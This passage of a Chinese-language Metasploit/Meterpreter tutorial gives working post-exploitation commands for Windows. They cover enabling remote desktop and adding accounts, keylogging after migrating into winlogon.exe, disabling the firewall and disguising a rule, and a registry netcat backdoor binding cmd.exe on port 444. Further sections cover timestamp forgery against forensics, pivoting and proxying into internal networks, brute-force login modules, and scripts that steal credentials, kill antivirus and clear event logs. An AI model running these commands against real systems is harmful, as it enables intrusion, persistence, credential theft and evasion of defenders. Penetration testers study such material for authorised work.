<p>当我们新添加的用户已经拥有<a href="https://www.coengoedegebure.com/hacking-windows-with-meterpreter/#anchor_createanewaccount"><span lang="EN-US">远程桌面权限</span></a>之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
<p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的<span lang="EN-US&gt;">getgui</span>脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启）：</p>
<p><a href="http://image.3001.net/images/20171121/1511265869872.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025540083-1521929743.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="114" border="0"></a></p>
<p>在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长：</p>
<p><a href="http://image.3001.net/images/20171121/15112658939687.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025540363-76299135.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="399" height="41" border="0"></a></p>
<p>这样可以降低你被发现的概率，因为当目标用户登录之后，它将会看到如下图所示的信息：</p>
<p><a href="http://image.3001.net/images/20171121/15112659137172.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025540926-2039349508.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="293" border="0"></a></p>
<p>下图显示的是攻击者使用新创建的“Hacker”账号连接到远程桌面的画面：</p>
<p><a href="http://image.3001.net/images/20171121/15112659225772.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025541931-1923094334.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="442" border="0"></a></p>
<p>run
post/windows/manage/enable_rdp</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025542363-965970766.gif" alt="20161006114052" width="554" height="118"></p>
<p>还可以使用&nbsp;run getgui -e<span lang="EN-US&gt;">&nbsp;</span>来开启远程桌面：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025542756-1024491208.gif" alt="20161006121512" width="554" height="127"></p>
<p>利用该命令，我们还可以在目标机器上添加用户：</p>
<p>run getgui -u xxxxx -p xxxxx</p>
<p><span lang="EN-US">22.</span>绑定进程</p>
<p>Meterpreter既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让<span lang="EN-US&gt;">Meterpreter</span>与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p>
<p>在下面的例子中，我们会将Meterpreter跟<span lang="EN-US&gt;">winlogon.exe</span>绑定，并在登录进程中捕获键盘记录。</p>
<p>首先，我们需要使用“ps”命令查看目标设备中运行的进程：</p>
<p><a href="http://image.3001.net/images/20171121/15112659759098.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025543448-160994124.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="289" border="0"></a></p>
<p>接下来，使用“getpid”找出需要绑定的进程，接下来，使用<span lang="EN-US&gt;">migrate</span>命令+pid来绑定进程。</p>
<p><a href="http://image.3001.net/images/20171121/15112659865114.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025543793-231628645.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="399" height="114" border="0"></a></p>
<p>绑定完成之后，我们就可以开始捕获键盘数据了：</p>
<p><a href="http://image.3001.net/images/20171121/15112659987040.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025544015-536576998.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="399" height="46" border="0"></a></p>
<p>接下来，我们可以选择导出键盘记录，或者使用命令“enum_logged_on_users”来检查用户是否成功登录：</p>
<p><a href="http://image.3001.net/images/20171121/15112660065902.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025544448-1207976548.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="185" border="0"></a></p>
<p>等待片刻之后，使用keyscan_dump命令导出记录信息<span lang="EN-US&gt;">:</span></p>
<p><a href="http://image.3001.net/images/20171121/15112660157793.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025544805-1844931953.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="399" height="186" border="0"></a></p>
<p>捕捉到的用户密码为trustno1</p>
<p><span lang="EN-US">23.</span>通过其 shell 来关闭防火墙</p>
<p>netsh adcfirewall set
allprofiles state off</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025545245-1516111933.gif" alt="20161006112128" width="554" height="140"></p>
<p>我们打开防火墙配置查看防火墙已成功被我们关闭!</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025545548-149606623.gif" alt="20161006113355" width="594" height="422"></p>
<p>但是我们可以看出，如果目标管理员查看防火墙配置，发现防火墙被人为关闭，那么必定引起管理员的警惕！因此，我们还可以通过策略的添加，来隐蔽我们的行为。</p>
<p>netsh firewall add portopening
TCP 444 “VMWARE” ENABLE ALL</p>
<p>伪装成一个系统正常的进程，之后远程重启目标系统，并利用 NC 连接即可！</p>
<p><span lang="EN-US">24.</span>利用注册表添加 NC 后门</p>
<p>1.上传 NC 到目标系统：</p>
<p>upload
/usr/share/windows-binaries/nc.exe C:\\windows\\system32</p>
<p>2.枚举注册表内容（开机启动）</p>
<p>reg enumkey -k
HKLM\\software\\microsoft\\windows\\currentversion\\run</p>
<p>3.在该注册表增加内容（开机启动）</p>
<p>reg setval -k
HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d
“C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe”</p>
<p>4.查看内容是否增加成功：</p>
<p>reg queryval -k
HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025546272-1692764591.gif" alt="20161006141320" width="553" height="310"></p>
<p><span lang="EN-US">25.</span>基于MACE时间的反电子取证</p>
<p>timestomp -v secist.txt&nbsp; #查看当前目标文件 MACE 时间。</p>
<p>timestomp c:/a.doc -c “10/27/2015
14:22:11” #修改文件的创建时间，例如修改文件的创建时间（反取证调查）</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025546736-1977348057.gif" alt="20161006172320" width="512" height="100"></p>
<p>timestomp -f c:\\AVScanner.ini
secist.txt&nbsp;（将模板文件<span lang="EN-US&gt;">MACE</span>时间，复制给当前文件）</p>
<p>timestomp -v secist.txt</p>
<p><span lang="EN-US">26.</span>内网代理</p>
<div>
<p>meterpreter &gt; run autoroute -s 192.168.1.0/24</p>
<p>msf exploit(handler) &gt; use
auxiliary/scanner/portscan/tcp</p>
<p>msf auxiliary(tcp) &gt; set PORTS
80,8080,21,22,3389,445,1433,3306</p>
<p>msf auxiliary(tcp) &gt; set RHOSTS 192.168.3.1/24</p>
<p>msf auxiliary(tcp) &gt; set THERADS 10</p>
<p>msf auxiliary(tcp) &gt; exploit</p>
<p>meterpreter &gt; background</p>
<p>msf exploit(handler) &gt; use auxiliary/server/socks4a</p>
<p>msf auxiliary(socks4a) &gt; route print</p>
<p>msf auxiliary(socks4a) &gt; ifconfig</p>
<p>msf auxiliary(socks4a) &gt; set SRVHOST xxx.xxx.xx.xx
#xxx.xxx.xx.xx为自己运行msf的<span lang="EN-US">vps</span>机子<span lang="EN-US">'</span></p>
<p>msf auxiliary(socks4a) &gt; exploit</p>

</div>
<p><span lang="EN-US">27.SSH</span>代理</p>
<div>
<p>msf &gt; load meta_ssh</p>
<p>msf &gt; use multi/ssh/login_password</p>
<p>msf &gt; set RHOST 192.168.56.3</p>
<p>RHOST =&gt; 192.168.56.3</p>
<p>msf &gt; set USER test</p>
<p>USER =&gt; test</p>
<p>msf &gt; set PASS reverse</p>
<p>PASS =&gt; reverse</p>
<p>msf &gt; set PAYLOAD ssh/metassh_session</p>
<p>PAYLOAD =&gt; ssh/metassh_session</p>
<p>msf &gt; exploit -z</p>
<p>[*] Connecting to dsl@192.168.56.3:22 with password
reverse</p>
<p>[*] metaSSH session 1 opened (127.0.0.1 -&gt;
192.168.56.3:22) at 2011-12-28&nbsp;&nbsp; 03:51:16
+1300</p>
<p>[*] Session 1 created in the background.</p>
<p>msf &gt; route add 192.168.57.0 255.255.255.0 1</p>

</div>
<p>之后就是愉快的内网扫描了</p>
<p>当然还是推荐直接用</p>
<div>
<p>ssh -f -N -D 127.0.0.1:6666 test@103.224.81.1.1</p>

</div>
<p><span lang="EN-US">28.</span>内网扫描</p>
<div>
<p>meterpreter &gt; run autoroute -s 192.168.3.98</p>
<p>meterpreter &gt; background</p>
<p>[*] Backgrounding session 2...</p>
<p>msf exploit(handler) &gt; use
auxiliary/scanner/portscan/tcp</p>
<p>msf auxiliary(tcp) &gt; set PORTS
80,8080,21,22,3389,445,1433,3306</p>
<p>PORTS =&gt; 80,8080,21,22,3389,445,1433,3306</p>
<p>msf auxiliary(tcp) &gt; set RHOSTS 192.168.3.1/24</p>
<p>RHOSTS =&gt; 192.168.3.1/24</p>
<p>msf auxiliary(tcp) &gt; set THERADS 10</p>
<p>THERADS =&gt; 10</p>
<p>msf auxiliary(tcp) &gt; exploit</p>

</div>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025548498-847879145.gif" alt="" width="554" height="587"></p>
<p>我还是推荐开代理用Nmap扫描<span lang="EN-US">&gt;.&lt;</span></p>
<p><span lang="EN-US">29.</span>一些常用的破解模块</p>
<div>
<p>auxiliary/scanner/mssql/mssql_login</p>
<p>auxiliary/scanner/ftp/ftp_login</p>
<p>auxiliary/scanner/ssh/ssh_login</p>
<p>auxiliary/scanner/telnet/telnet_login</p>
<p>auxiliary/scanner/smb/smb_login</p>
<p>auxiliary/scanner/mssql/mssql_login</p>
<p>auxiliary/scanner/mysql/mysql_login</p>
<p>auxiliary/scanner/oracle/oracle_login</p>
<p>auxiliary/scanner/postgres/postgres_login</p>
<p>auxiliary/scanner/vnc/vnc_login</p>
<p>auxiliary/scanner/pcanywhere/pcanywhere_login</p>
<p>auxiliary/scanner/snmp/snmp_login</p>
<p>auxiliary/scanner/ftp/anonymous</p>

</div>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025550517-433707359.gif" alt="" width="554" height="439"></p>
<p><span lang="EN-US">30.</span>一些好用的模块</p>
<div>
<p>auxiliary/admin/realvnc_41_bypass&nbsp; (Bypass VNCV4网上也有利用工具<span lang="EN-US">)</span></p>
<p>auxiliary/admin/cisco/cisco_secure_acs_bypass （cisco Bypass 版本5.1或者未打补丁<span lang="EN-US">5.2</span>版洞略老）</p>
<p>auxiliary/admin/http/jboss_deploymentfilerepository （内网遇到Jboss最爱:)）</p>
<p>auxiliary/admin/http/dlink_dir_300_600_exec_noauth (Dlink
命令执行:)</p>
<p>auxiliary/admin/mssql/mssql_exec （用爆破得到的sa弱口令进行执行命令没回显:(）</p>
<p>auxiliary/scanner/http/jboss_vulnscan (Jboss 内网渗透的好朋友)</p>
<p>auxiliary/admin/mysql/mysql_sql (用爆破得到的弱口令执行sql语句:)</p>
<p>auxiliary/admin/oracle/post_exploitation/win32exec （爆破得到Oracle弱口令来Win32命令执行）</p>
<p>auxiliary/admin/postgres/postgres_sql (爆破得到的postgres用户来执行sql语句<span lang="EN-US">)</span></p>
<p>auxiliary/scanner/rsync/modules_list&nbsp; （<span lang="EN-US">Rsync</span>）</p>
<p>auxiliary/scanner/misc/redis_server&nbsp; (Redis)</p>
<p>auxiliary/scanner/ssl/openssl_heartbleed (心脏滴血)</p>
<p>auxiliary/scanner/mongodb/mongodb_login (Mongodb)</p>
<p>auxiliary/scanner/elasticsearch/indices_enum
(elasticsearch)</p>
<p>auxiliary/scanner/http/axis_local_file_include (axis本地文件包含)</p>
<p>auxiliary/scanner/http/http_put (http Put)</p>
<p>auxiliary/scanner/http/gitlab_user_enum (获取内网gitlab用户)</p>
<p>auxiliary/scanner/http/jenkins_enum (获取内网jenkins用户)</p>
<p>auxiliary/scanner/http/svn_scanner （svn Hunter :)）</p>
<p>auxiliary/scanner/http/tomcat_mgr_login (Tomcat 爆破)</p>
<p>auxiliary/scanner/http/zabbix_login （Zabbix :)）</p>

</div>
<h2>0x05 常见脚本</h2>
<p>在获得<span lang="EN-US&gt;">meterpreter</span>的session后，除了<span lang="EN-US&gt;">meterpreter</span>本身内置的一些基本功能，在/usr/share/metasploit-framework/scripts/meterpreter下面还有很多<span lang="EN-US&gt;">scripts</span>，提供了很多额外功能，非常好用</p>
<p>我看网上没有详细介绍常见脚本功能的文章<span lang="EN-US&gt;">,</span>就总结了一下</p>
<p>我们可以通过<span lang="EN-US&gt;">run </span>脚本名来进行使用</p>
<p>run 脚本名 -h可以查看帮助</p>
<p><span lang="EN-US">1.arp_scanner</span></p>
<p>利用<span lang="EN-US&gt;">arp</span>进行存活主机扫描</p>
<p>run&nbsp; arp_scanner-r&nbsp; 192.168.1.0/24</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025550938-1883039561.gif" alt="" width="554" height="84"></p>
<p><span lang="EN-US">2.autoroute</span></p>
<p>可以添加，删除，显示路由表</p>
<p><span lang="EN-US">3.checkvm</span></p>
<p>可以检测目标是否是虚拟机</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025551376-750595215.gif" alt="" width="553" height="45"></p>
<p><span lang="EN-US">4.credcollect</span></p>
<p>收集目标主机上的<span lang="EN-US&gt;">hash</span>等凭证</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025551675-1474014799.gif" alt="" width="553" height="182"></p>
<p><span lang="EN-US">5.domain_list_gen</span></p>
<p>获取域管理账户列表，并判断当前<span lang="EN-US&gt;">session</span>所在用户是否在列表中</p>
<p><span lang="EN-US">6.dumplinks</span></p>
<p>Link文件包含时间戳，文件位置，共享名，卷序列号，等。脚本会在用户目录和<span lang="EN-US&gt;">office</span>目录中收集lnk文件</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025552212-1107389080.gif" alt="" width="554" height="201"></p>
<p>调用<span lang="EN-US&gt;">post/windows/gather/dumplinks</span>获取目标主机上最近访问过的文档、链接信息</p>
<p>命令：<span lang="EN-US&gt;">run&nbsp; post/windows/gather/dumplinks</span></p>
<p>效果如下图：</p>
<p><br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025553097-939182348.gif" alt="" width="638" height="375"></p>
<p><span lang="EN-US">7.duplicate</span></p>
<p>再次产生<span lang="EN-US&gt;">payload</span>，注入到其他进程或打开新进程并注入其中</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025553472-1759287361.gif" alt="" width="553" height="157"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025554041-895555347.gif" alt="" width="405" height="429"></p>
<p><span lang="EN-US">8.enum_chrome</span></p>
<p>获取<span lang="EN-US&gt;">chrome</span>中的信息</p>
<p><span lang="EN-US">9.enum_firefox</span></p>
<p>获取<span lang="EN-US&gt;">firefox</span>中的信息，包括cooikie，历史纪录，书签等</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025554288-824143740.gif" alt="" width="554" height="62"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025554575-1007158086.gif" alt="" width="554" height="89"></p>
<p><span lang="EN-US">10.enum_logged_on_users</span></p>
<p>列出当前登录的用户</p>
<p><span lang="EN-US">11.enum_powershell_env</span></p>
<p>列出<span lang="EN-US&gt;">powershell</span>和WSH的配置文件</p>
<p><span lang="EN-US">12.enum_putty</span></p>
<p>列出<span lang="EN-US&gt;">putty</span>的配置文件</p>
<p><span lang="EN-US">13.enum_shares</span></p>
<p>列出共享及历史共享</p>
<p><span lang="EN-US">14.enum_vmware</span></p>
<p>列出<span lang="EN-US&gt;">vmware</span>的配置文件和产品</p>
<p><span lang="EN-US">15.event_manager</span></p>
<p>可以查询和清理事件日志</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025554820-761546121.gif" alt="" width="554" height="77"></p>
<p><span lang="EN-US">16.file_collector</span></p>
<p>搜索符合指定模式的文件</p>
<p><span lang="EN-US">17.get_application_list</span></p>
<p>获取安装的程序列表及版本</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025555061-124679317.gif" alt="" width="553" height="141"></p>
<p><span lang="EN-US">18.getcountermeasure</span></p>
<p>列出<span lang="EN-US&gt;">HIPS </span>和 AV 的进程，显示XP 防火墙规则<span lang="EN-US&gt;">, </span>并且显示 DEP和UAC 策略</p>
<p>Ps：-k参数可以杀掉防护软件进程</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025555455-2002923670.gif" alt="" width="553" height="273"></p>
<p><span lang="EN-US">19.get_env</span></p>
<p>获取所有用户的环境变量</p>
<p><span lang="EN-US">20.get_filezilla_creds</span></p>
<p>获取<span lang="EN-US&gt;">filezilla</span>的登陆凭证</p>
<p><span lang="EN-US">21.getgui</span></p>
<p>可以很方便的开启远程桌面服务，添加用户，端口转发功能</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025555936-286147803.gif" alt="" width="553" height="247"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025556295-2013057719.gif" alt="" width="553" height="150"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025556628-1091848798.gif" alt="" width="554" height="215"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025557069-1525335400.gif" alt="" width="554" height="309"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025557538-1359724836.gif" alt="" width="554" height="309"></p>
<p><span lang="EN-US">22.get_local_subnets</span></p>
<p>获得本地的子网</p>
<p><span lang="EN-US">23.get_pidgin_creds</span></p>
<p>获取<span lang="EN-US&gt;">pidgin</span>配置文件中的用户名和密码</p>
<p><span lang="EN-US">24.gettelnet</span></p>
<p>同之前开启终端桌面服务的脚本，这个是用来开启<span lang="EN-US&gt;">telnet</span>的</p>
<p><span lang="EN-US">25.get_valid_community</span></p>
<p>获取<span lang="EN-US&gt;">SNMP community</span>字符串</p>
<p><span lang="EN-US">26.getvncpw</span></p>
<p>获取<span lang="EN-US&gt;">vnc</span>密码</p>
<p><span lang="EN-US">27.hashdump</span></p>
<p>同<span lang="EN-US&gt;">meterpreter</span>的内置功能</p>
<p><span lang="EN-US">28.hostsedit</span></p>
<p>操作<span lang="EN-US&gt;">hosts</span>文件</p>
<p><span lang="EN-US">29.keylogrecorder</span></p>
<p>Meterpreter内置此功能</p>
<p><span lang="EN-US">30.killav</span></p>
<p>关闭防护软件</p>
<p><span lang="EN-US">31.metsvc</span></p>
<p>将<span lang="EN-US&gt;">payload</span>安装为服务</p>
<p><span lang="EN-US">32. migrate</span></p>
<p>将<span lang="EN-US&gt;">meterpreter</span>会话移植到另一个进程</p>
<p>例如反弹的<span lang="EN-US&gt;">meterpreter</span>会话是对方打开了一个你预置特殊代码的word文档而产生的，那么对方一旦关闭掉该<span lang="EN-US&gt;">word</span>文档，我们获取到的meterpreter会话就会随之关闭，所以把会话进程注入到<span lang="EN-US&gt;">explorer.exe</span>是一个好方法</p>
<p>可以先用<span lang="EN-US&gt;">ps</span>命令看一下目标主机的explorer.exe进程的<span lang="EN-US&gt;">pid</span></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025558611-883758876.gif" alt="" width="645" height="340"><br>是<span lang="EN-US&gt;">1668</span>然后我们用migrate 1668 把<span lang="EN-US&gt;">meterpreter</span>会话注入进去</p>
<p><span lang="EN-US">33 .persistence</span></p>
<p>可见建立一个持久性的后门，设置成开机启动</p>
<p><span lang="EN-US">34. service_permissions_escalate</span></p>
<p>许多服务被配置了不安全
的权限。 这个脚本会尝试创建一个服务, 然后会搜索已存在d服务，找到不安全的文件或配置有问题的文件，用一个<span lang="EN-US&gt;">payload</span>替换掉他，然后会尝试重启服务来运行这个paylaod，如果重启服务失败，则在下次服务器重启时会执行<span lang="EN-US&gt;">payload</span></p>
<p><span lang="EN-US">35.vnc</span></p>
<p>可以看到远程桌面</p>
<p><span lang="EN-US">36. win32-sshserver</span></p>
<p>安装<span lang="EN-US&gt;">openssh</span>服务</p>
<p><span lang="EN-US">37. winenum</span></p>
<p>会自动运行多种命令，将命令结果保存到本地</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025559381-1577792043.gif" alt="" width="554" height="387"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025559874-269538336.gif" alt="" width="553" height="259"></p>
<h2>0x06 msfvenom命令参数 </h2>
<p>metasploit-framework旗下的msfpayload（荷载生成器），<span lang="EN-US&gt;">msfencoder</span>（编码器），msfcli（监听接口）已经被整合成<span lang="EN-US&gt;">msfvenom</span>。可以利用msfvenom生成木马程序，并且目标机上执行，在本地做监听</p>
<p>1.msfvenom命令行选项</p>
<p>在kali的命令行中输入msfvenom
-h就会显示其用法：</p>
<div>
<p>Options:</p>
<p>-p, --payload&lt;payload&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定需要使用的payload(攻击荷载)</p>
<p>-l, --list[module_type]&nbsp;&nbsp; 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</p>
<p>-n, --nopsled&lt;length&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为payload预先指定一个NOP滑动长度</p>
